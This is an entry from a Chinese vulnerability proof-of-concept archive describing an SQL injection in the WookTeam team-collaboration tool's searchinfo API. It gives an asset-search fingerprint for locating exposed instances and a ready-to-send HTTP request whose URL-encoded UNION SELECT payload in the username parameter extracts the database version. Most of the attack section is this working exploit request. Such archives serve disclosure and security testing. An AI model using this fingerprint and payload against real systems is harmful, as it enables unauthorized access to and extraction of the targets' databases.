---
source: "wy876 漏洞文库"
---

# WookTeam searchinfo存在SQL注入漏洞

# 一、漏洞简介
WookTeam是一款轻量级的开源在线团队协作工具，提供各类文档协作工具、在线思维导图、在线流程图、项目管理、任务分发、即时IM，知识库管理等工具。WookTeam接口searchinfo存在SQL注入漏洞

# 二、影响版本
+ WookTeam 

# 三、资产测绘
```plain
title="Wookteam"
```


# 四、漏洞复现
```plain
GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Host: 
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ocbt8satalaaymlq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
